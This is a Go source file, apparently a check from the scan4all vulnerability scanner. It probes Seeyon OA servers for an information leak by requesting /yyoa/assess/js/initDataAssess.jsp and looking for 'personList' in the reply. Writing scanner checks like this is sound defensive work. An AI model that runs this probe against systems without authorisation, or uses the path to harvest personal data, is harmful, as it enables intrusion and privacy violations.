package seeyon

import (
	"github.com/GhostTroops/scan4all/lib/util"
)

//initDataAssess.jsp 用户敏感信息泄露

func InitDataAssess(u string) bool {
	if req, err := util.HttpRequset(u+"/yyoa/assess/js/initDataAssess.jsp", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && util.StrContains(req.Body, "personList") {
			util.SendLog(req.RequestUrl, "seeyon", "Found vuln seeyon InitDataAssess", "")
			return true
		}
	}
	return false
}
